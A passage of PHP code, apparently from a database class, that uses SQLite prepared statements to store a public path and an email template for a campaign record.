        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
        $stmt->execute();

        return $publicPath;
    }

    public function updateEmailTemplate($campaignId, $template) {
        $stmt = $this->db->prepare("UPDATE campaigns SET email_template = :tmpl WHERE id = :id");
        if (!$stmt) {
            error_log("Failed to prepare updateEmailTemplate: " . $this->db->lastErrorMsg());
            return false;
        }
        $stmt->bindValue(':tmpl', $template, SQLITE3_TEXT);
        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
        return $stmt->execute() ? true : false;
    }
}
